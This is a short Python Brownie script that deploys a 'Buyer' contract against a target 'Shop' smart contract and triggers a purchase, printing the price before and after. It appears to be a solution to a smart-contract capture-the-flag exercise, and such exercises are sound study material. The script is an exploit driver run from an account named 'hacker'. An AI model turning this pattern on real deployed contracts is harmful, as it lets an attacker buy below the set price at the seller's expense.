from brownie import accounts, config, Buyer, interface

def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    shop = interface.ShopInterface(target)
    buyer = Buyer.deploy(target, {'from': hacker})
    print(f'Current price: {shop.price()}')
    buyer.buy()
    print(f'New price: {shop.price()}')
